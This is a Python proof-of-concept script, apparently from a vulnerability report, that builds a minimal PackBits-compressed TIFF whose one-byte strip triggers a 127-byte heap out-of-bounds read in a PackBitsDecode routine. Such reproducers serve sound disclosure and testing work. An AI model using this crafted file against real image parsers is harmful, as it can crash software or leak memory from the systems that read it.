#!/usr/bin/env python3
"""
PoC generator for VULN 001: PackBitsDecode literal-copy branch heap OOB read
Generates a PACKBITS-compressed TIFF where a strip ends with a literal-run
header byte 0x7E (copy next 127 bytes) but no data bytes follow.
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

def write_tiff():
    # TIFF little-endian header
    # Magic: 0x4949 = "II" (little-endian), version = 42
    # IFD offset will be computed after we know where it is.

    # Strip data: single byte 0x7E
    # 0x7E = 126 decimal, which is a literal-run header meaning "copy next 127 bytes"
    # but no bytes follow → OOB read of 127 bytes
    strip_data = b'\x7E'

    # Layout:
    # Offset 0:  TIFF header (8 bytes)
    # Offset 8:  Strip data (1 byte)
    # Offset 9:  IFD starts (2-byte entry count + entries + next IFD offset)

    strip_offset = 8   # strip data immediately after header
    ifd_offset = 9     # IFD immediately after strip data

    # IFD entries (sorted by tag number):
    # Tag, Type, Count, Value/Offset
    # Types: 1=BYTE, 3=SHORT, 4=LONG
    entries = [
        (0x0100, 3, 1, 4),        # ImageWidth = 4
        (0x0101, 3, 1, 1),        # ImageLength = 1
        (0x0102, 3, 1, 8),        # BitsPerSample = 8
        (0x0103, 3, 1, 32773),    # Compression = PackBits (0x8005)
        (0x0106, 3, 1, 1),        # PhotometricInterpretation = BlackIsZero
        (0x0111, 4, 1, strip_offset),  # StripOffsets = offset to strip data
        (0x0115, 3, 1, 1),        # SamplesPerPixel = 1
        (0x0116, 4, 1, 1),        # RowsPerStrip = 1
        (0x0117, 4, 1, 1),        # StripByteCounts = 1 (only 1 byte in strip)
    ]

    # Build binary
    buf = bytearray()

    # TIFF header: byte order mark, magic, IFD offset
    buf += struct.pack('<HHI', 0x4949, 42, ifd_offset)  # 8 bytes

    # Strip data
    buf += strip_data  # 1 byte at offset 8

    # IFD: entry count
    buf += struct.pack('<H', len(entries))  # 2 bytes

    # IFD entries (12 bytes each)
    for tag, typ, count, value in entries:
        buf += struct.pack('<HHII', tag, typ, count, value)

    # Next IFD offset = 0 (no more IFDs)
    buf += struct.pack('<I', 0)

    with open(OUTPUT, 'wb') as f:
        f.write(buf)

    print(f"Written: {OUTPUT} ({len(buf)} bytes)")
    print(f"Strip at offset {strip_offset}, 1 byte = 0x7E")
    print("Expected: PackBitsDecode OOB read of 127 bytes past strip buffer")

if __name__ == '__main__':
    write_tiff()
